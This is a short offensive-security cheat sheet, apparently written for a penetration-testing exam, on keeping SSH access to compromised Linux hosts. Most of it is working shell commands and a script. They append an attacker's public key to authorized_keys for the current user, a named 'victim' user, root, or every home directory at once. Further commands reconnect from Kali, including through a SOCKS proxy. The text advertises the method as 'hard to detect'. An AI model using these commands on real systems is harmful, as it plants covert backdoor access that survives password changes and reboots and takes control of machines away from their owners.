# Linux SSH Key Persistence

Fast, reliable, hard to detect. Adds your public key to target users' authorized_keys — survives password changes and reboots.

---

## Single User Key Deployment

```bash
# Your public key (generate on Kali if needed):
ssh-keygen -t ed25519 -f /tmp/exam_key -N ""
cat /tmp/exam_key.pub   # copy this

# Deploy to current user:
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo "ssh-ed25519 AAAA... kali@exam" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Deploy to another user (requires write access to their home):
mkdir -p /home/victim/.ssh && chmod 700 /home/victim/.ssh
echo "ssh-ed25519 AAAA... kali@exam" >> /home/victim/.ssh/authorized_keys
chmod 600 /home/victim/.ssh/authorized_keys
chown -R victim:victim /home/victim/.ssh

# Deploy to root (requires root):
mkdir -p /root/.ssh && chmod 700 /root/.ssh
echo "ssh-ed25519 AAAA... kali@exam" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

---

## Deploy to All Writable .ssh Directories (Script)

```bash
#!/bin/bash
# Requires root to reach all home dirs
PUBKEY="ssh-ed25519 AAAA... kali@exam"

for home in /home/* /root; do
    sshdir="$home/.ssh"
    authkeys="$sshdir/authorized_keys"
    owner=$(stat -c '%U' "$home" 2>/dev/null)

    if [ -d "$sshdir" ] || mkdir -p "$sshdir" 2>/dev/null; then
        echo "$PUBKEY" >> "$authkeys"
        chmod 700 "$sshdir"
        chmod 600 "$authkeys"
        chown -R "$owner":"$owner" "$sshdir" 2>/dev/null
        echo "[+] Key deployed: $authkeys"
    fi
done
```

---

## Connect Back

```bash
# From Kali:
ssh -i /tmp/exam_key victim@TARGET_IP
ssh -i /tmp/exam_key root@TARGET_IP

# Through SOCKS proxy:
proxychains4 ssh -i /tmp/exam_key root@INTERNAL_IP

# Specify port if non-standard:
ssh -i /tmp/exam_key -p 2222 root@TARGET_IP
```
